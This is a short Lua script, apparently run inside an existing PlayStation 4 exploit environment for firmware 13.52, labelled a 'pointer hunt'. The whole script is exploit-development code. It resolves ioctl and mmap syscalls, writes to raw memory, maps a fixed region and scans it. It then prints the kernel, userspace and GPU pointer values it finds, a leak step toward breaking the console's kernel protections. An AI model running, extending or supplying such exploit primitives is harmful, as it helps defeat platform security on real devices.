-- PS4 FW 13.52 - POINTER HUNT ONLY (r9ae), small output to avoid stream truncation
local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9AE START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
  mem.write_qword(buf, 0x2ec48000)
  mem.write_qword(buf + 8, 0x100000)
  local rarm = t(S.ioctl(5, 0x80108002, buf))
  local m = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  print("arm=" .. rarm .. " map=0x" .. string.format("%x", m))
  local kptr, uptr, gp = {}, {}, {}
  for i = 0, 0x3fff do
    local v = rq(m + i * 8)
    if v >= 0xfffffff000000000 then kptr[#kptr + 1] = string.format("%05x=%016x", i * 8, v) end
    if v >= 0x8000000000000000 and v < 0xfffffff000000000 then
      uptr[#uptr + 1] = string.format("%05x=%016x", i * 8, v)
    end
    if v >= 0xc000000000000000 and v < 0xc100000000000000 then
      gp[#gp + 1] = string.format("%05x=%016x", i * 8, v)
    end
  end
  print("kernel_ptrs=" .. #kptr)
  for i = 1, math.min(#kptr, 24) do print("K " .. kptr[i]) end
  print("userspace_ptrs=" .. #uptr)
  for i = 1, math.min(#uptr, 24) do print("U " .. uptr[i]) end
  print("gpu64_ptrs=" .. #gp)
  for i = 1, math.min(#gp, 24) do print("G " .. gp[i]) end
end)
print("=== R9AE DONE ===")
